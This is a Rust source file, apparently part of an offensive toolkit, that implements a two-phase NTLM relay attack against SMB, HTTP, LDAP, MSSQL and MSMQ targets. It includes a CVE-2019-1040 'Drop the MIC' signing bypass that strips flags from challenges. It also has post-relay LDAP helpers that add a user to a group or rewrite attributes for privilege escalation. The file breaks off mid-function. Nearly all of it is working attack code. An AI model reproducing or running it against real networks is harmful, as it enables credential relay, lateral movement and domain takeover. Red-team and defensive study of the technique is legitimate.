//! NTLM Relay Module
//!
//! Relays captured NTLM authentication to target services
//! for lateral movement and privilege escalation.
//!
//! # How NTLM Relay Works
//!
//! 1. Victim connects to our fake service (responder)
//! 2. Victim sends NTLM NEGOTIATE
//! 3. We forward NEGOTIATE to target â†’ get target's CHALLENGE
//! 4. We send the target's CHALLENGE back to victim
//! 5. Victim computes AUTHENTICATE against target's challenge
//! 6. We forward AUTHENTICATE to target
//! 7. Target authenticates us as victim
//!
//! The relay is split into two phases because the victim needs
//! the target's challenge before it can produce AUTHENTICATE.

use crate::{Protocol, RelayError, RelayTarget, Result};
use overthrone_core::error::OverthroneError;
use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::{Arc, RwLock};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::Semaphore;
use tracing::{debug, info, warn};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NTLM Protocol Constants
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NTLM Signing Flags & AvPair Constants ([MS-NLMP])
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// NTLMSSP_NEGOTIATE_SIGN â€” client/server support message signing
const NTLMSSP_NEGOTIATE_SIGN: u32 = 0x0000_0010;
/// NTLMSSP_NEGOTIATE_SEAL â€” client/server support message sealing
const NTLMSSP_NEGOTIATE_SEAL: u32 = 0x0000_0020;
/// NTLMSSP_NEGOTIATE_ALWAYS_SIGN â€” signing is always performed
const NTLMSSP_NEGOTIATE_ALWAYS_SIGN: u32 = 0x0000_8000;

/// NTLM message types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NtlmMessageType {
    /// `` variant
    Negotiate = 1,
    /// `` variant
    Challenge = 2,
    /// `` variant
    Authenticate = 3,
}

/// Parse NTLM message type from raw bytes
pub fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
    if data.len() < 12 {
        return None;
    }
    if &data[0..8] != NTLM_SIGNATURE {
        return None;
    }
    match u32::from_le_bytes([data[8], data[9], data[10], data[11]]) {
        1 => Some(NtlmMessageType::Negotiate),
        2 => Some(NtlmMessageType::Challenge),
        3 => Some(NtlmMessageType::Authenticate),
        _ => None,
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Relay State
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Relay state
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub enum RelayState {
    /// Relay is stopped
    #[default]
    Stopped,
    /// Relay is running
    Running,
    /// Relay encountered an error
    Error(String),
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Relay Configuration
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Relay configuration
#[derive(Debug, Clone)]
pub struct RelayConfig {
    /// IP address to listen on
    pub listen_ip: String,
    /// targets field
    pub targets: Vec<RelayTarget>,
    /// Try all targets in round-robin fashion
    pub round_robin: bool,
    /// Remove targets after successful relay
    pub remove_on_success: bool,
    /// Connection timeout in seconds
    pub timeout_secs: u64,
    /// Enable LDAP signing bypass (challenge flag stripping + MIC removal).
    /// Uses the "Drop the MIC" technique (CVE-2019-1040) to relay NTLM
    /// authentication to LDAP targets that have signing set to "Negotiate".
    pub ldap_signing_bypass: bool,
    /// Maximum number of retries per relay attempt (across targets)
    pub max_retries: u32,
    /// Maximum concurrent connections
    pub max_connections: usize,
}

impl Default for RelayConfig {
    fn default() -> Self {
        Self {
            listen_ip: "0.0.0.0".to_string(),
            targets: Vec::new(),
            round_robin: true,
            remove_on_success: true,
            timeout_secs: 30,
            ldap_signing_bypass: true,
            max_retries: 3,
            max_connections: 64,
        }
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Relay Statistics
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Relay statistics
#[derive(Debug, Default)]
pub struct RelayStats {
    /// successful relays field
    pub successful_relays: AtomicU32,
    /// failed relays field
    pub failed_relays: AtomicU32,
    /// active connections field
    pub active_connections: AtomicU32,
    /// Total count
    pub total_attempts: AtomicU32,
    /// Network protocol variant
    pub stats_by_protocol: Arc<RwLock<HashMap<String, u32>>>,
}

impl Clone for RelayStats {
    fn clone(&self) -> Self {
        Self {
            successful_relays: AtomicU32::new(self.successful_relays.load(Ordering::Relaxed)),
            failed_relays: AtomicU32::new(self.failed_relays.load(Ordering::Relaxed)),
            active_connections: AtomicU32::new(self.active_connections.load(Ordering::Relaxed)),
            total_attempts: AtomicU32::new(self.total_attempts.load(Ordering::Relaxed)),
            stats_by_protocol: Arc::new(RwLock::new(
                self.stats_by_protocol
                    .read()
                    .map(|guard| guard.clone())
                    .unwrap_or_else(|_| HashMap::new()),
            )),
        }
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Two-Phase Relay State
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// A pending relay connection that has completed Phase 1 (negotiate)
/// and is waiting for Phase 2 (authenticate).
pub struct PendingRelay {
    /// Unique ID for this relay attempt
    pub relay_id: u64,
    /// Target we connected to
    pub target: RelayTarget,
    /// Async TCP stream to the target (kept alive between phases)
    stream: TcpStream,
    /// The NTLM challenge received from the target
    pub challenge: Vec<u8>,
    /// SMB2 session ID (needed for subsequent session setup)
    smb_session_id: u64,
    /// SMB2 message ID counter
    smb_message_id: u64,
}

/// Result of a successful relay (Phase 2 complete)
pub struct RelayedSession {
    /// Target domain FQDN
    pub target: RelayTarget,
    /// Username for authentication
    pub username: String,
    /// Domain FQDN
    pub domain: String,
    /// stream field
    pub stream: TcpStream,
    /// Stable unique identifier.
    pub smb_session_id: u64,
    /// LDAP message ID counter (starts at 3 after SASL bind used 1 & 2)
    ldap_msg_id: u32,
}

impl RelayedSession {
    fn next_ldap_id(&mut self) -> u32 {
        let id = self.ldap_msg_id;
        self.ldap_msg_id += 1;
        id
    }

    /// Add a user DN to a group via LDAP Modify (add member attribute).
    /// Only usable when the relay target is LDAP/LDAPS.
    pub async fn ldap_add_to_group(&mut self, user_dn: &str, group_dn: &str) -> Result<()> {
        let msg_id = self.next_ldap_id();
        let pdu = build_ldap_modify_add_member(group_dn, user_dn, msg_id);
        self.stream
            .write_all(&pdu)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP modify write: {}", e)))?;

        let mut buf = vec![0u8; 16384];
        let len = self
            .stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP modify read: {}", e)))?;

        let code = parse_ldap_generic_result(&buf[..len], 0x67)?;
        if code == 0 {
            info!("âœ“ LDAP modify success: added {} to {}", user_dn, group_dn);
            Ok(())
        } else {
            Err(RelayError::Protocol(format!("LDAP modify failed â€” result code {}", code)).into())
        }
    }

    /// Perform a base-scope LDAP search (e.g. read an object's attributes).
    /// Returns raw LDAP SearchResultEntry bytes for caller to parse.
    pub async fn ldap_search(
        &mut self,
        base_dn: &str,
        filter: &str,
        attrs: &[&str],
    ) -> Result<Vec<u8>> {
        let msg_id = self.next_ldap_id();
        let pdu = build_ldap_search_request(base_dn, filter, attrs, msg_id);
        self.stream
            .write_all(&pdu)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP search write: {}", e)))?;

        let mut buf = vec![0u8; 65536];
        let len = self
            .stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP search read: {}", e)))?;

        Ok(buf[..len].to_vec())
    }

    /// Modify an LDAP attribute (replace operation).
    pub async fn ldap_modify_replace(
        &mut self,
        dn: &str,
        attribute: &str,
        values: &[&str],
    ) -> Result<()> {
        let msg_id = self.next_ldap_id();
        let pdu = build_ldap_modify_replace(dn, attribute, values, msg_id);
        self.stream
            .write_all(&pdu)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP modify write: {}", e)))?;

        let mut buf = vec![0u8; 16384];
        let len = self
            .stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("LDAP modify read: {}", e)))?;

        let code = parse_ldap_generic_result(&buf[..len], 0x67)?;
        if code == 0 {
            Ok(())
        } else {
            Err(
                RelayError::Protocol(format!("LDAP modify-replace failed â€” code {}", code))
                    .into(),
            )
        }
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NTLM Relay Handler
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// NTLM Relay handler â€” fully async, two-phase architecture
pub struct NtlmRelay {
    config: RelayConfig,
    state: RelayState,
    stats: RelayStats,
    pending: HashMap<u64, PendingRelay>,
    next_id: AtomicU64,
    /// Target round-robin index
    target_idx: usize,
    /// Connection pool semaphore
    pool: Arc<Semaphore>,
}

impl NtlmRelay {
    /// Create a new NTLM relay with the given configuration
    pub fn new(config: RelayConfig) -> Self {
        let max_conn = config.max_connections.max(1);
        Self {
            config,
            state: RelayState::Stopped,
            stats: RelayStats::default(),
            pending: HashMap::new(),
            next_id: AtomicU64::new(1),
            target_idx: 0,
            pool: Arc::new(Semaphore::new(max_conn)),
        }
    }

    /// Start the relay
    pub async fn start(&mut self) -> Result<()> {
        if self.state != RelayState::Stopped {
            return Err(RelayError::Config("Relay already running".to_string()).into());
        }

        if self.config.targets.is_empty() {
            warn!("No relay targets configured");
        }

        info!(
            "NTLM relay ready with {} target(s)",
            self.config.targets.len()
        );

        for target in &self.config.targets {
            info!("  -> {}://{}", target.protocol, target.address);
        }

        self.state = RelayState::Running;
        Ok(())
    }

    /// Stop the relay
    pub async fn stop(&mut self) -> Result<()> {
        if self.state == RelayState::Stopped {
            return Ok(());
        }

        info!(
            "Stopping NTLM relay â€” dropping {} pending relays",
            self.pending.len()
        );
        self.pending.clear();
        self.state = RelayState::Stopped;
        info!("NTLM relay stopped");
        Ok(())
    }

    /// Get relay statistics
    pub fn get_stats(&self) -> RelayStats {
        self.stats.clone()
    }

    /// Check if relay is running
    pub fn is_running(&self) -> bool {
        self.state == RelayState::Running
    }

    /// Get configuration
    pub fn config(&self) -> &RelayConfig {
        &self.config
    }

    /// Add a target
    pub fn add_target(&mut self, target: RelayTarget) {
        self.config.targets.push(target);
    }

    /// Remove a target by address
    pub fn remove_target(&mut self, addr: &SocketAddr) {
        self.config.targets.retain(|t| &t.address != addr);
    }

    /// Pick the next target (round-robin)
    fn next_target(&mut self) -> Option<RelayTarget> {
        if self.config.targets.is_empty() {
            return None;
        }
        let target = self.config.targets[self.target_idx % self.config.targets.len()].clone();
        self.target_idx = self.target_idx.wrapping_add(1);
        Some(target)
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Phase 1: Forward NEGOTIATE â†’ get CHALLENGE
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    /// Phase 1 of NTLM relay.
    /// Connects to the next available target, forwards the victim's
    /// NEGOTIATE message, and returns the target's CHALLENGE.
    /// The caller (responder) must send this CHALLENGE back to the
    /// victim, then call `relay_authenticate()` with the victim's
    /// AUTHENTICATE response.
    /// Retries across targets on failure up to `max_retries` times.
    pub async fn relay_negotiate(&mut self, ntlm_negotiate: &[u8]) -> Result<(u64, Vec<u8>)> {
        let max_attempts = self.config.max_retries.max(1);
        let mut last_error: Option<OverthroneError> = None;

        for attempt in 0..max_attempts {
            let target = self
                .next_target()
                .ok_or_else(|| RelayError::Config("No relay targets available".into()))?;

            self.stats.total_attempts.fetch_add(1, Ordering::Relaxed);

            debug!(
                "Phase 1 attempt {}/{}: connecting to {}://{}",
                attempt + 1,
                max_attempts,
                target.protocol,
                target.address
            );

            let timeout = Duration::from_secs(self.config.timeout_secs);

            let result = match target.protocol {
                Protocol::Smb => {
                    let _permit = self
                        .pool
                        .acquire()
                        .await
                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;

                    let (stream, challenge, session_id, msg_id) = self
                        .smb_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                        .await?;

                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                    info!(
                        "Phase 1 complete â†’ relay_id={}, target={}://{}",
                        relay_id, target.protocol, target.address
                    );

                    self.pending.insert(
                        relay_id,
                        PendingRelay {
                            relay_id,
                            target,
                            stream,
                            challenge: challenge.clone(),
                            smb_session_id: session_id,
                            smb_message_id: msg_id,
                        },
                    );

                    Ok((relay_id, challenge))
                }
                Protocol::Http | Protocol::Https | Protocol::Webdav => {
                    let _permit = self
                        .pool
                        .acquire()
                        .await
                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;

                    let (stream, challenge) = self
                        .http_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                        .await?;

                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                    self.pending.insert(
                        relay_id,
                        PendingRelay {
                            relay_id,
                            target,
                            stream,
                            challenge: challenge.clone(),
                            smb_session_id: 0,
                            smb_message_id: 0,
                        },
                    );

                    Ok((relay_id, challenge))
                }
                Protocol::Ldap | Protocol::Ldaps => {
                    let _permit = self
                        .pool
                        .acquire()
                        .await
                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;

                    let (stream, mut challenge) = self
                        .ldap_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                        .await?;

                    if self.config.ldap_signing_bypass {
                        strip_signing_flags_from_challenge(&mut challenge);
                        debug!(
                            "LDAP signing bypass: stripped SIGN/SEAL flags from challenge for {}",
                            target.address
                        );
                    }

                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                    self.pending.insert(
                        relay_id,
                        PendingRelay {
                            relay_id,
                            target,
                            stream,
                            challenge: challenge.clone(),
                            smb_session_id: 0,
                            smb_message_id: 0,
                        },
                    );

                    Ok((relay_id, challenge))
                }
                Protocol::Mssql => {
                    let _permit = self
                        .pool
                        .acquire()
                        .await
                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;

                    let (stream, challenge) = self
                        .mssql_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                        .await?;

                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                    self.pending.insert(
                        relay_id,
                        PendingRelay {
                            relay_id,
                            target,
                            stream,
                            challenge: challenge.clone(),
                            smb_session_id: 0,
                            smb_message_id: 0,
                        },
                    );

                    Ok((relay_id, challenge))
                }
                Protocol::Msmq => {
                    let _permit = self
                        .pool
                        .acquire()
                        .await
                        .map_err(|_| RelayError::Config("Connection pool closed".into()))?;

                    let (stream, challenge) = self
                        .msmq_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                        .await?;

                    let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);

                    self.pending.insert(
                        relay_id,
                        PendingRelay {
                            relay_id,
                            target,
                            stream,
                            challenge: challenge.clone(),
                            smb_session_id: 0,
                            smb_message_id: 0,
                        },
                    );

                    Ok((relay_id, challenge))
                }
            };

            match result {
                Ok(val) => return Ok(val),
                Err(e) => {
                    warn!(
                        "Phase 1 attempt {}/{} failed: {}",
                        attempt + 1,
                        max_attempts,
                        e
                    );
                    last_error = Some(e);
                }
            }
        }

        let err = last_error.unwrap_or_else(|| {
            RelayError::Config("All relay targets failed after exhausting retries".into()).into()
        });
        Err(err)
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    // Phase 2: Forward AUTHENTICATE â†’ get session
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    /// Phase 2 of NTLM relay.
    /// Takes the relay_id from Phase 1 and the victim's AUTHENTICATE
    /// message (computed against the target's challenge), forwards it
    /// to the target, and returns the authenticated session.
    pub async fn relay_authenticate(
        &mut self,
        relay_id: u64,
        ntlm_authenticate: &[u8],
    ) -> Result<RelayedSession> {
        let mut pending = self.pending.remove(&relay_id).ok_or_else(|| {
            RelayError::Protocol(format!("No pending relay with id {}", relay_id))
        })?;

        let (username, domain) = parse_ntlm_authenticate_info(ntlm_authenticate)?;

        debug!(
            "Phase 2: authenticating {}\\{} to {}://{}",
            domain, username, pending.target.protocol, pending.target.address
        );

        let result = match pending.target.protocol {
            Protocol::Smb => {
                self.smb_session_setup_auth(
                    &mut pending.stream,
                    ntlm_authenticate,
                    pending.smb_session_id,
                    pending.smb_message_id,
                )
                .await
            }
            Protocol::Http | Protocol::Https | Protocol::Webdav => {
                self.http_authenticate(&mut pending.stream, ntlm_authenticate, &pending.target)
                    .await
            }
            Protocol::Ldap | Protocol::Ldaps => {
                // Apply LDAP signing bypass: strip MIC + SIGN/SEAL flags from
                // the AUTHENTICATE as a belt-and-suspenders measure alongside
                // the challenge modification done in Phase 1.
                if self.config.ldap_signing_bypass {
                    let patched = prepare_authenticate_for_ldap_relay(ntlm_authenticate);
                    debug!(
                        "LDAP signing bypass: patched AUTHENTICATE ({} bytes) for {}",
                        patched.len(),
                        pending.target.address
                    );
                    self.ldap_authenticate(&mut pending.stream, &patched).await
                } else {
                    self.ldap_authenticate(&mut pending.stream, ntlm_authenticate)
                        .await
                }
            }
            Protocol::Mssql => {
                self.mssql_authenticate(&mut pending.stream, ntlm_authenticate)
                    .await
            }
            Protocol::Msmq => {
                self.msmq_authenticate(&mut pending.stream, ntlm_authenticate)
                    .await
            }
        };

        match result {
            Ok(()) => {
                info!(
                    "âœ“ Relay successful: {}\\{} â†’ {}://{}",
                    domain, username, pending.target.protocol, pending.target.address
                );

                self.stats.successful_relays.fetch_add(1, Ordering::Relaxed);
                if let Ok(mut guard) = self.stats.stats_by_protocol.write() {
                    *guard
                        .entry(pending.target.protocol.to_string())
                        .or_insert(0) += 1;
                }

                if self.config.remove_on_success {
                    let addr = pending.target.address;
                    self.config.targets.retain(|t| t.address != addr);
                }

                Ok(RelayedSession {
                    target: pending.target,
                    username,
                    domain,
                    stream: pending.stream,
                    smb_session_id: pending.smb_session_id,
                    ldap_msg_id: 3,
                })
            }
            Err(e) => {
                self.stats.failed_relays.fetch_add(1, Ordering::Relaxed);
                warn!(
                    "âœ— Relay failed: {}\\{} â†’ {}: {}",
                    domain, username, pending.target.address, e
                );
                Err(e)
            }
        }
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // SMB Relay â€” Phase 1
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    /// Connect to SMB target, do SMB2 negotiate, then session setup
    /// with the victim's NTLM negotiate. Returns (stream, challenge, session_id, msg_id).
    async fn smb_negotiate_and_challenge(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>, u64, u64)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| {
                RelayError::Connection(format!("SMB connect to {}: {}", target.address, e))
            })?;

        let mut buf = vec![0u8; 65536];
        let mut msg_id: u64 = 0;

        // â”€â”€ SMB2 NEGOTIATE â”€â”€
        let smb_negotiate = build_smb2_negotiate(msg_id);
        msg_id += 1;
        stream
            .write_all(&smb_negotiate)
            .await
            .map_err(|e| RelayError::Network(format!("SMB negotiate write: {}", e)))?;

        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("SMB negotiate read: {}", e)))?;

        if len < 68 || &buf[4..8] != b"\xfeSMB" {
            return Err(RelayError::Protocol("Invalid SMB2 negotiate response".into()).into());
        }

        debug!("SMB2 negotiate OK with {}", target.address);

        // â”€â”€ SESSION_SETUP with NTLM NEGOTIATE â”€â”€
        let session_setup = build_smb2_session_setup(ntlm_negotiate, 0, msg_id);
        msg_id += 1;
        stream
            .write_all(&session_setup)
            .await
            .map_err(|e| RelayError::Network(format!("Session setup write: {}", e)))?;

        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("Session setup read: {}", e)))?;

        if len < 68 {
            return Err(RelayError::Protocol("Session setup response too short".into()).into());
        }

        // Check status â€” STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
        let status = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
        if status != 0xC0000016 {
            return Err(RelayError::Protocol(format!(
                "Expected STATUS_MORE_PROCESSING_REQUIRED, got 0x{:08X}",
                status
            ))
            .into());
        }

        // Extract session ID (8 bytes at offset 44)
        let session_id = u64::from_le_bytes([
            buf[44], buf[45], buf[46], buf[47], buf[48], buf[49], buf[50], buf[51],
        ]);

        // Extract NTLM challenge from security buffer
        let challenge = extract_ntlm_from_smb2(&buf[..len])?;

        debug!(
            "Got NTLM challenge from {}, session_id=0x{:016X}",
            target.address, session_id
        );

        Ok((stream, challenge, session_id, msg_id))
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // SMB Relay â€” Phase 2
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async fn smb_session_setup_auth(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
        session_id: u64,
        msg_id: u64,
    ) -> Result<()> {
        let pdu = build_smb2_session_setup(ntlm_authenticate, session_id, msg_id);
        stream
            .write_all(&pdu)
            .await
            .map_err(|e| RelayError::Network(format!("Session auth write: {}", e)))?;

        let mut buf = vec![0u8; 65536];
        let len = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Network(format!("Session auth read: {}", e)))?;

        if len < 12 {
            return Err(RelayError::Protocol("Auth response too short".into()).into());
        }

        let status = u32::from_le_bytes([buf[12], buf[13], buf[14], buf[15]]);
        if status == 0 {
            Ok(())
        } else {
            Err(
                RelayError::Authentication(format!("SMB auth failed: NT_STATUS 0x{:08X}", status))
                    .into(),
            )
        }
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // HTTP Relay â€” Phase 1 & 2
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async fn http_negotiate_and_challenge(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        timeout: Duration,
    ) -> Result<(TcpStream, Vec<u8>)> {
        let mut stream = tokio::time::timeout(timeout, TcpStream::connect(target.address))
            .await
            .map_err(|_| {
                RelayError::Connection(format!("Timeout connecting to {}", target.address))
            })?
            .map_err(|e| RelayError::Connection(format!("HTTP connect: {}", e)))?;

        let negotiate_b64 = base64_encode(ntlm_negotiate);
        let request = format!(
            "GET / HTTP/1.1\r\n\
             Host: {}\r\n\
             Authorization: NTLM {}\r\n\
             Connection: keep-alive\r\n\
             \r\n",
            target.address.ip(),
            negotiate_b64
        );

        stream
            .write_all(request.as_bytes())
            .await
            .map_err(|e| RelayError::Network(format!("HTTP negotiate write: {}", e)))?;

        let mut response = vec![0u8; 16384];
        let len = stream
            .read(&mut response)
            .await
            .map_err(|e| RelayError::Network(format!("HTTP negotiate read: {}", e)))?;

        let response_str = String::from_utf8_lossy(&response[..len]);

        // Must be 401 with WWW-Authenticate: NTLM <challenge>
        let challenge_b64 = response_str
            .lines()
            .find(|l| l.to_lowercase().starts_with("www-authenticate: ntlm "))
            .and_then(|l| l.splitn(3, ' ').nth(2))
            .ok_or_else(|| RelayError::Protocol("No NTLM challenge in HTTP 401".into()))?;

        let challenge = base64_decode(challenge_b64.trim())
            .ok_or_else(|| RelayError::Protocol("Invalid base64 in HTTP challenge".into()))?;

        if parse_ntlm_type(&challenge) != Some(NtlmMessageType::Challenge) {
            return Err(RelayError::Protocol("HTTP response is not NTLM challenge".into()).into());
        }

        debug!("Got NTLM challenge from HTTP {}", target.address);
        Ok((stream, challenge))
    }

    async fn http_authenticate(
        &self,
        stream: &mut TcpStream,
        ntlm_authenticate: &[u8],
        target: &RelayTarget,
    ) -> Result<()> {
        let auth_b64 = base64_encode(ntlm_authenticate);
        let request = format!(
            "GET / HTTP/1.1\r\n\
             Host: {}\r\n\
             Authorization: NTLM {}\r\n\
             Connection: keep-alive\r\n\
             \r\n",
            target.address.ip(),
            auth_b64
        );

        stream
            .write_all(request.as_bytes())
            .await
            .map_err(|e| RelayError::Network(format!("HTTP auth write: {}", e)))?;

        let mut response = vec![0u8; 16384];
        let len = stream
            .read(&mut response)
            .await
            .map_err(|e| RelayError::Network(format!("HTTP auth read: {}", e)))?;

        let response_str = String::from_utf8_lossy(&response[..len]);

        // Only 200 OK means success â€” 401 means auth FAILED
        if response_str.starts_with("HTTP/1.1 200") || response_str.starts_with("HTTP/1.0 200") {
            Ok(())
        } else {
            let status_line = response_str.lines().next().unwrap_or("(empty)");
            Err(RelayError::Authentication(format!("HTTP auth failed: {}", status_line)).into())
        }
    }

    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    // LDAP Relay â€” Phase 1 & 2
    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async fn ldap_negotiate_and_challenge(
        &self,
